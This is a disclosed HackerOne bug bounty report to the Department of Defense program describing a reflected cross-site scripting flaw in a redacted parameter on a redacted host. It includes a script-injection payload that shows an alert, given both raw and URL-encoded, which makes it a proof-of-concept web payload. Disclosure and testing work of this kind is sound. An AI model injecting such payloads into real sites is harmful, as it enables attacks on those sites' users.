# XSS Reflected on https://███ (███ parameter)

## Report Details
- **Report ID**: 1143776
- **URL**: https://hackerone.com/reports/1143776
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-03-31T23:22:07.789Z
- **Disclosed**: 2021-07-29T19:41:36.949Z

## Reporter
- **Username**: fiveguyslover
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Greetings, i've found an xss on https://█████ (██████████ parameter)

link : https://█████/████████?████████=%22%3E%3Cscript%3Ealert(/frenchvlad/);%3C/script%3E&██████████

Payload : 
```
"><script>alert(/frenchvlad/);</script>
```

██████

best regards,
frenchvlad

## Impact

A reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored, thus allowing the attacker to inject malicious content.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
link : https://██████/████?████████=%22%3E%3Cscript%3Ealert(/frenchvlad/);%3C/script%3E&███████

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
